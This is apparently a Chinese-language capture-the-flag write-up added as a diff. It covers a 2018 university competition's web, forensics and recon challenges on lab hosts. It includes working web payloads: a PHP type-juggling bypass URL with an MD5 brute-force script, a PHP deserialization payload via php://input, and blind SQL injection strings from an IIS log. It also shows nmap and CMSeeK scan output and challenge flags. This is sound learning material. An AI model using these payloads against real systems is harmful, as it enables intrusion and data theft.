@@ -1,0 +1,350 @@
+2018/9/16  福师大黑盾杯
+
+![1537107338208](images/1537107338208.png)
+
+# 信息泄露+代码审计
+
+svn泄露源码：http://192.168.200.200/web/codeaudit/.svn/text-base/index.php.svn-base.txt 
+
+```php
+<?php
+error_reporting(0);
+$user = $_COOKIE['user'];
+$code = $_GET['code']?(int)$_GET['code']:'';
+if($user == 'admin' && !empty($code)) {
+	$hex = (int)$code;
+	if(($hex ^ 6789) === 0xCDEF) {
+		require("flag.php");
+		echo $flag;
+		exit();
+	}	
+echo "ȱ��Ӧ�еĲ���,��û��Ȩ�޲鿴������";
+?>
+```
+
+`GET` 请求`code=55146` ，  请求头添加`Cookie: user=admin;` 。
+
+`flag{a737c5c5b759c3705c8100accf65b5e4}` 
+
+# 最好的语言
+
+```php
+<?php 
+show_source(__FILE__); 
+$a=0; 
+$b=0; 
+$c=0; 
+$d=0; 
+if (isset($_GET['x1'])) //$x1=0;=>$a=1;
+{ 
+        $x1 = $_GET['x1']; 
+        $x1=="1"?die("ha?"):NULL; 
+        switch ($x1) 
+        { 
+        case 0: 
+        case 1: 
+                $a=1; 
+                break; 
+        } 
+} 
+$x2=(array)json_decode(@$_GET['x2']); 
+//$x2=json_encode(['x21'=>'2018hello','x22'=>[[],0]]) ;
+//string(32) "{"x21":"2018hello","x22":[[],0]}"
+if(is_array($x2)){ 
+    is_numeric(@$x2["x21"])?die("ha?"):NULL; 
+    if(@$x2["x21"]){ 
+        ($x2["x21"]>2017)?$b=1:NULL; 
+    } 
+    if(is_array(@$x2["x22"])){ 
+        if(count($x2["x22"])!==2 OR !is_array($x2["x22"][0])) die("ha?"); 
+        $p = array_search("XIPU", $x2["x22"]); 
+        //array_search — 在数组中搜索给定的值，如果成功则返回相应的键名 
+        //mixed array_search( mixed $needle, array $haystack[, bool $strict = false] )
+        //第三个参数决定在搜索时是否比较类型，默认不比较，也是这里能够绕过的原因。
+        //var_dump(array_search('XIPU', array("0","1",0)));//int(2)
+        //0==‘XIPU’为真，搜索到0值的下标为2
+        $p===false?die("ha?"):NULL; 
+        foreach($x2["x22"] as $key=>$val){ 
+            $val==="XIPU"?die("ha?"):NULL; 
+        } 
+        $c=1; 
+} 
+} 
+$x3 = $_GET['x3']; 
+if ($x3 != '15562') { 
+    if (strstr($x3, 'XIPU')) { 
+        if (substr(md5($x3),8,16) == substr(md5('15562'),8,16)) { 
+            //两个符合正则  /0e\d+/  的字符串弱相等。
+            // 爆破见下方python代码
+            $d=1; 
+        } 
+    } 
+} 
+if($a && $b && $c && $d){ 
+    include "flag.php"; 
+    echo $flag; 
+} 
+?>
+```
+
+```python
+def brute():
+    for a in range(0x20, 0x7f):
+        for b in range(0x20, 0x7f):
+            for c in range(0x20, 0x7f):
+                    x = chr(a) + chr(b) + chr(c)+s
+                    mm=md5(x.encode('UTF-8')).hexdigest()
+                    flag=1
+                    for i in mm[10:24]:
+                        if i not in '0123456789':
+                            flag=0
+                            break
+                    if flag and mm[8:10]=='0e':
+                        print(x)
+
+brute()
+# kN[XIPU
+# v=|XIPU
+# y'wXIPU
+# }MOXIPU
+# ~VhXIPU
+## http://192.168.200.200/web/bestlanguage/?x1=0&x2={%22x21%22:%222018hello%22,%22x22%22:[[],0]}&x3=~VhXIPU
+## flag{510ea2879fa29d0d618b1f55350965c3}
+```
+
+# the user is admin
+
+bugku原题，只改了文件名和字符串。可以直接看 [原题](https://findneo.github.io/180406BugkuWriteup/#welcome-to-bugkuctf) ，不赘述。
+
+```php
+/web/theuserisadmin/?file=class.php&user=php://input&pass=O:4:"Read":1:{s:4:"file";s:8:"f1a9.php";}
+
+post:the user is admin
+    
+//flag{078d8dd8023d5716a11780adf344dfd2}
+```
+
+# ccgs
+
+![1537109403700](images/1537109403700.png)
+
+```python
+binwalk -e sgcc.png
+cat secret.txt | base64 -d | base64 -d > final.png
+//原本用notepad++解码base64，然后拷贝到winhex不成功。后来用这么一句话解决了，很舒服
+//Linux大法好 \o/
+```
+
+![1537070199581](images/1537070199581.png)
+
+# [x]TheSameInside
+
+foremost pcap=>pyc
+
+VGVsbCB5b3UgYXJndj1mbGFn=>Tell you argv=flag
+
+python -c "import dis;dis.dis(open('FINISHITGETIT.pyc').read())" > FINISHITGETIT.py
+
+脑洞无边，貌似没有人做出来。
+
+# [x]Spartacus
+
+让看肌肉，不是很懂。。。
+
+![1537109675591](images/1537109675591.png)
+
+
+
+# 注入日志分析
+
+**author: [Mads](https://madsome.one/) **  
+
+给了一个日志文件，`file data.log`得到是一个文本文件，直接打开，前几行是
+
+```
+#Software: Microsoft Internet Information Services 6.0
+#Version: 1.0
+#Date: 2015-10-21 09:16:34
+```
+
+猜测是IIS服务器记录的流量日志， 分析前几行
+
+```
+2015-10-21 09:16:34 W3SVC1 192.168.1.135 GET /index.htm - 80 - 192.168.1.101 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10.10;+rv:41.0)+Gecko/20100101+Firefox/41.0 200 0 0
+2015-10-21 09:16:34 W3SVC1 192.168.1.135 GET /favicon.ico - 80 - 192.168.1.101 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10.10;+rv:41.0)+Gecko/20100101+Firefox/41.0 404 0 2
+2015-10-21 09:16:36 W3SVC1 192.168.1.135 GET /show.asp id=2 80 - 192.168.1.101 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10.10;+rv:41.0)+Gecko/20100101+Firefox/41.0 200 0 0
+2015-10-21 09:25:01 W3SVC1 192.168.1.135 GET /show.asp id=2%27|17|80040e14|字符串_''_之前有未闭合的引号。 80 - 192.168.1.101 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10.10;+rv:41.0)+Gecko/20100101+Firefox/41.0 500 0 0
+```
+
+可以看到就是一条条的HTTP请求，并且后面跟着状态码。继续浏览，看到`id`字段出现一些`SQL`的关键字，那么可以想到这记录的就是`sqlmap`(或许)的注入流量分析。思路就是找到关键的注入请求，文件很大，我们可以搜索`flag`试试，找到关键的请求如下
+
+```
+...
+2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2%20AND%20UNICODE%28SUBSTRING%28%28SELECT%20ISNULL%28CAST%28LTRIM%28STR%28COUNT%28DISTINCT%28theflag%29%29%29%29%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%20FROM%20tourdata.dbo.news%29%2C1%2C1%29%29%3E51|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0
+2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2%20AND%20UNICODE%28SUBSTRING%28%28SELECT%20ISNULL%28CAST%28LTRIM%28STR%28COUNT%28DISTINCT%28theflag%29%29%29%29%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%20FROM%20tourdata.dbo.news%29%2C1%2C1%29%29%3E48 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0
+...
+```
+
+可以利用文本编辑器如`sublime text 3`的`ctrl+H`的替换功能， 将关键流量进行精简并`urldecode`利于分析(截取两个代表性请求)
+
+```
+id=2 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(LTRIM(STR(COUNT(DISTINCT(theflag)))) AS NVARCHAR(4000)),CHAR(32)) FROM tourdata.dbo.news),1,1))>51|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 500 0 0
+id=2 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(LTRIM(STR(COUNT(DISTINCT(theflag)))) AS NVARCHAR(4000)),CHAR(32)) FROM tourdata.dbo.news),1,1))>48 80 200 0 0
+```
+
+可以看到这里是二分法盲注的HTTP请求，现在思路很明确了， 从`SUBSTRING(.*, 1, 1)`开始找，并且只要看最后几条的注入请求就可以判断出字符是多少。 比如`SUBSTRING(.*, 1, 1) > 48`的状态码是`200`，`SUBSTRING(.*, 1, 1) > 49`的状态码是`500`，那其实就可以确定字符的ascii码是49。就这样就能得到`theflag`的值。
+
+# brightstar
+
+[列移位密码](https://ctf-wiki.github.io/ctf-wiki/crypto/classical/others/#_9) 
+
+# 这是啥呀
+
+base32编码
+
+# 下午
+
+cmsSeek 扫出配置文件 http://192.168.200.202//configuration.php.txt 
+
+底部有flag:`flag{0b58f603ff55c0c190502b44b4ffbf2c}`  
+
+此外还扫出一些东西，但msf不熟悉导致爆破举步维艰。实战经验还是缺乏，需要多锻炼。
+
+```python
+━Target: 192.168.200.201
+ ┃
+ ┠── CMS: WordPress
+ ┃    │
+ ┃    ├── Version: 4.9.5
+ ┃    ╰── URL: https://wordpress.org
+ ┃
+ ┠──[WordPress Deepscan]
+ ┃    │
+ ┃    ├── Readme file found: http://192.168.200.201//readme.html
+ ┃    ├── License file: http://192.168.200.201//license.txt
+ ┃    ├── Uploads directory has listing enabled: http://192.168.200.201//wp-content/uploads
+ ┃    │
+ ┃    ├── Plugins Enumerated: 1
+ ┃    │    │
+ ┃    │    ╰── Plugin: wp-with-spritz
+ ┃    │        │
+ ┃    │        ├── Version: 4.9.5
+ ┃    │        ╰── URL: http://192.168.200.201//wp-content/plugins/wp-with-spritz
+ ┃    │
+ ┃    │
+ ┃    ├── Themes Enumerated: 1
+ ┃    │    │
+ ┃    │    ╰── Theme: twentyseventeen
+ ┃    │        │
+ ┃    │        ├── Version: 4.9.5
+ ┃    │        ╰── URL: http://192.168.200.201//wp-content/themes/twentyseventeen
+ ┃    │
+ ┃    │
+ ┃    ├── Usernames harvested: 1
+ ┃    │    ╰── admin
+ ┃    │
+ ┃
+ ┠── Result: /root/heidun/tool/identify/CMSeeK/Result/192.168.200.201/cms.json
+ ┃
+ ┗━Scan Completed in 55.03 Seconds, using 45 Requests
+```
+
+
+
+```python
+root@kali:~/heidun# nmap 192.168.200.202
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-09-16 13:20 CST
+Nmap scan report for 192.168.200.202
+Host is up (1.5s latency).
+Not shown: 987 closed ports
+PORT      STATE    SERVICE
+80/tcp    open     http
+135/tcp   open     msrpc
+139/tcp   open     netbios-ssn
+445/tcp   open     microsoft-ds
+514/tcp   filtered shell
+3306/tcp  open     mysql
+49152/tcp open     unknown
+49153/tcp open     unknown
+49154/tcp open     unknown
+49155/tcp open     unknown
+49156/tcp open     unknown
+49157/tcp open     unknown
+49158/tcp open     unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 28.38 seconds
+root@kali:~/heidun# 
+nmap 192.168.200.201
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-09-16 14:08 CST
+Nmap scan report for 192.168.200.201
+Host is up (0.91s latency).
+Not shown: 996 closed ports
+PORT     STATE    SERVICE
+22/tcp   open     ssh
+80/tcp   open     http
+514/tcp  filtered shell
+3389/tcp open     ms-wbt-server
+
+Nmap done: 1 IP address (1 host up) scanned in 19.39 seconds
+
+```
+
+
+
+
+
+```python
+root@kali:~/heidun/tool/identify/CMSeeK/Result/192.168.200.201# cat cms.json 
+{
+    "cms_id": "wp",
+    "cms_name": "WordPress",
+    "cms_url": "https://wordpress.org",
+    "detection_param": "header",
+    "last_scanned": "2018-09-16 12:15:04.516587",
+    "url": "http://192.168.200.201/",
+    "wp_license": "http://192.168.200.201//license.txt",
+    "wp_plugins": "wp-with-spritz Version 4.9.5,",
+    "wp_readme_file": "http://192.168.200.201//readme.html",
+    "wp_themes": "twentyseventeen Version 4.9.5,",
+    "wp_uploads_directory": "http://192.168.200.201//wp-content/uploads",
+    "wp_users": "admin,",
+    "wp_version": "4.9.5"
+}
+root@kali:~/heidun/tool/identify/CMSeeK/Result/192.168.200.201# cat ../192.168.200.202/cms.json 
+{
+    "cms_id": "joom",
+    "cms_name": "joomla",
+    "cms_url": "https://joomla.org",
+    "detection_param": "header",
+    "joomla_backup_files": "
+    http://192.168.200.202//2.txt,
+    http://192.168.200.202//1.tar,
+    http://192.168.200.202//1.txt,
+    http://192.168.200.202//1.rar,
+    http://192.168.200.202//1.tmp,
+    http://192.168.200.202//1.tgz,
+    http://192.168.200.202//1.tar.gz,
+    http://192.168.200.202//1.tar.bz2,
+    http://192.168.200.202//1.gz,
+    http://192.168.200.202//1.zip,
+    http://192.168.200.202//2.tar,
+    http://192.168.200.202//2.back,
+    http://192.168.200.202//2.tar.bz2,
+    http://192.168.200.202//2.backup,
+    http://192.168.200.202//2.save,
+    http://192.168.200.202//1.save,
+    http://192.168.200.202//2.rar,
+    http://192.168.200.202//2.tmp,
+    http://192.168.200.202//2.gz,
+    http://192.168.200.202//2.tar.gz,
+    http://192.168.200.202//2.tgz,
+    http://192.168.200.202//2.zip,",
+    "joomla_config_files": "http://192.168.200.202//configuration.php.txt,",
+    "joomla_debug_mode": "disabled",
+    "joomla_readme_file": "http://192.168.200.202//README.txt",
+    "joomla_version": "3.7.1",
+    "last_scanned": "2018-09-16 12:05:04.841063",
+    "url": "http://192.168.200.202/"
+
+```
+
